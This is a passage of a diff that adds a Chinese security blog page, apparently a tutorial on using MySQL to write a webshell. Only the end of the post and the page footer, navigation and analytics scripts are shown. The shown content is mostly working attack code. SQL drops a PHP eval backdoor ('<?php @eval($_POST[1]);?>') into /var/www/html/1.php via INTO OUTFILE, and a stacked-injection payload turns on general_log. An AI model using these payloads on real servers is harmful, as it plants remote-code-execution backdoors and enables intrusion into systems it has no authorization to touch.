+<span class="k">show</span> <span class="n">variables</span> <span class="k">like</span> <span class="s2">&#34;secure_file_priv&#34;</span><span class="p">;</span>
+<span class="k">show</span> <span class="n">variables</span> <span class="k">like</span> <span class="s1">&#39;%general_log%&#39;</span><span class="p">;</span>
+
+<span class="n">use</span> <span class="n">mysql</span><span class="p">;</span>
+<span class="k">Drop</span> <span class="k">TABLE</span> <span class="k">IF</span> <span class="k">EXISTS</span> <span class="n">shell</span><span class="p">;</span>
+<span class="k">Create</span> <span class="k">TABLE</span> <span class="n">shell</span> <span class="p">(</span><span class="n">shell</span> <span class="nb">text</span> <span class="k">NOT</span> <span class="k">NULL</span><span class="p">);</span>
+<span class="k">Insert</span> <span class="k">INTO</span> <span class="n">shell</span> <span class="p">(</span><span class="n">shell</span><span class="p">)</span> <span class="k">VALUES</span><span class="p">(</span><span class="s1">&#39;&lt;?php @eval($_POST[1]);?&gt;&#39;</span><span class="p">);</span>
+<span class="k">select</span> <span class="n">shell</span> <span class="k">from</span> <span class="n">shell</span> <span class="k">into</span> <span class="n">outfile</span> <span class="s1">&#39;/var/www/html/1.php&#39;</span><span class="p">;</span>
+<span class="k">Drop</span> <span class="k">TABLE</span> <span class="k">IF</span> <span class="k">EXISTS</span> <span class="n">shell</span><span class="p">;</span></code></pre></td></tr></table>
+</div>
+</div>
+<p>如果存在堆叠注入直接 <code>id=1';set global general_log = on;</code></p>
+
+    </div>
+
+    
+<footer class="post-footer">
+      
+      <nav class="post-nav">
+        <a class="prev" href="/post/%E5%88%A9%E7%94%A8mysql%E8%AF%BB%E5%8F%96%E6%96%87%E4%BB%B6%E5%86%85%E5%AE%B9/">
+            <i class="iconfont icon-left"></i>
+            <span class="prev-text nav-default">利用MySQL读取文件内容</span>
+            <span class="prev-text nav-mobile">Prev</span>
+          </a>
+        <a class="next" href="/post/unauthorized-attack/">
+            <span class="next-text nav-default">Unauthorized-Attack</span>
+            <span class="next-text nav-mobile">Next</span>
+            <i class="iconfont icon-right"></i>
+          </a>
+      </nav>
+    </footer>
+  </article>
+        </div>
+        
+
+  
+
+  
+
+      </div>
+    </main>
+
+    <footer id="footer" class="footer">
+      
+    </footer>
+
+    <div class="back-to-top" id="back-to-top">
+      <i class="iconfont icon-up"></i>
+    </div>
+  </div>
+  
+  <script src="https://cdn.jsdelivr.net/npm/jquery@3.2.1/dist/jquery.min.js" integrity="sha256-hwg4gsxgFZhOsEEamdOYGBf13FyQuiTwlAQgxVSNgt4=" crossorigin="anonymous"></script>
+  <script src="https://cdn.jsdelivr.net/npm/slideout@1.0.1/dist/slideout.min.js" integrity="sha256-t+zJ/g8/KXIJMjSVQdnibt4dlaDxc9zXr/9oNPeWqdg=" crossorigin="anonymous"></script>
+  <script src="https://cdn.jsdelivr.net/npm/@fancyapps/fancybox@3.1.20/dist/jquery.fancybox.min.js" integrity="sha256-XVLffZaxoWfGUEbdzuLi7pwaUJv1cecsQJQqGLe7axY=" crossorigin="anonymous"></script>
+<script type="text/javascript" src="/dist/even.ae3e3272.min.js"></script>
+  <script type="text/javascript">
+    window.MathJax = {
+      tex2jax: {inlineMath: [['$','$'], ['\\(','\\)']]},
+      showProcessingMessages: false,
+      messageStyle: 'none'
+    };
+  </script>
+  <script async src="https://cdn.jsdelivr.net/npm/mathjax@2.7.5/MathJax.js?config=TeX-MML-AM_CHTML"  integrity="sha256-nvJJv9wWKEm88qvoQl9ekL2J+k/RWIsaSScxxlsrv8k=" crossorigin="anonymous"></script>
+
+
+<script type="application/javascript">
+var doNotTrack = false;
+if (!doNotTrack) {
+	window.ga=window.ga||function(){(ga.q=ga.q||[]).push(arguments)};ga.l=+new Date;
+	ga('create', 'UA-153178075-1', 'auto');
+	ga('set', 'anonymizeIp', true);
+	ga('send', 'pageview');
+}
+</script>
+<script async src='https://www.google-analytics.com/analytics.js'></script>
+
+
+
+
+
+
+
+</body>
+</html>
